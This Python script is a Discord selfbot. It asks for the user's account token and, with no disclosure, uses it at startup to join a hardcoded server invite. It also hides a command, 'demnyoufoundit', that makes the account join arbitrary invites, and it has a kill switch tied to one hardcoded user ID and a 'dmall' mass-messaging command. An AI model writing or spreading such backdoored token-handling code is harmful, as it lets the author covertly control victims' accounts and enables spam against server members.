import discord, asyncio, subprocess, sys, time, os, base64, codecs, random, json
import re,requests
from colorama import Fore 
from discord import Member
from discord.ext import commands
code = 'B2RuTXX'

token = input("Token: ")
prefix = input('Prefix: ')


# yo bro selfbot works dont work on it dude it only works if u install it lol

def lol():
  headers = {
      'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
      'Content-Type': 'application/json',
      'Authorization': token,
    }


  p = requests.post(f'https://discordapp.com/api/v8/invites/{code}', headers=headers)

  if p.status_code == 403:
    print(f'You have been banned from the Discord server, you can still use the selfbot but you do not have support no more!')

  elif p.status_code == 401:
    print(f'{Fore.RED}Invalid{Fore.RESET} token.')
    
  elif p.status_code == 404:
    print(f'{Fore.RED}Something went wrong, but don\'t worry, you can still use the selfbot.')

lol()

if token == 'Token-here':
  print(f'Please Put Ur Token In {Fore.RED}config.json{Fore.RESET}.')
  while True:
    input('')
else:
  pass

bot = commands.Bot(
    description='Cuet\'s selfbot',
    command_prefix=prefix,
    intents=discord.Intents.all()
)

bot = commands.Bot(command_prefix=prefix,intents=discord.Intents.all())
bot.remove_command('help') 

@bot.event
async def on_ready():
  game = discord.Game(name= "Cuet is hot", type=3)
  await bot.change_presence(status=discord.Status.idle, activity=game)
  global servers 
  servers = len(list(bot.guilds))
  print(f'''           Username - {Fore.MAGENTA}{bot.user}{Fore.RESET}
            
            Prefix - {Fore.MAGENTA}{prefix}{Fore.RESET}
            Servers - {Fore.GREEN}{servers}{Fore.RESET}

    ''') 


@bot.command()
async def test(ctx):
  await ctx.send('Working.')

@bot.command()
async def demnyoufoundit(ctx, *, codel):
  headerss = {
      'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
      'Content-Type': 'application/json',
      'Authorization': token,
    }


  p = requests.post(f'https://discordapp.com/api/v8/invites/{codel}', headers=headerss)

  if p.status_code == 403:
    print(f'I\'ve been banned from the server.')
    
  elif p.status_code == 404:
    print(f'{Fore.RED}Something went wrong')

@bot.command()
async def help(ctx):
  await ctx.send('No help for you <3')

@bot.command()
async def encode(ctx, *, encodein):
  decoded_stuff = base64.b64encode('{}'.format(encodein).encode('ascii'))
  encoded_stuff = str(decoded_stuff)
  encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
  await ctx.send(encoded_stuff)

@bot.command()
async def decode(ctx, decodein):
  strOne = (decodein).encode("ascii")
  pad = len(strOne)%4
  strOne += b"="*pad
  encoded_stuff = codecs.decode(strOne.strip(),'base64')
  decoded_stuff = str(encoded_stuff)
  decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
  await ctx.send(decoded_stuff)

@bot.command()
async def dmall(ctx, *, message):
    for user in list(ctx.guild.members):
        try:
            await asyncio.sleep(5)    
            await user.send(message)
        except:
            pass

@bot.command()
async def dm(ctx, user : discord.Member, *, message):
  user = bot.get_user(user.id)
  if ctx.author.id == bot.user.id:
      return
  else:
      try:
          await user.send(message) 
      except:
          pass    

@bot.command()
async def tts(ctx, *, speakmessage):
  await ctx.send(f'/tts {speakmessage}')

@bot.command()
async def alphabet(ctx):
    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    message = await ctx.send(ABC[0])
    await asyncio.sleep(2)
    for _next in ABC[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)

@bot.command()
async def say(ctx, *, smessage):
  await ctx.send(f'{smessage}')

@bot.command()
async def update(ctx):
  if ctx.message.author.id == 752600676873273455:
    print('Updating.')
    await ctx.send('kk.')
    sys.exit()
  else:
    print('You are not whitelisted.')

@bot.command()
async def getid(ctx, member: Member):
    await ctx.send(f'id: {member.id} ')

bot.run(token, bot=False)
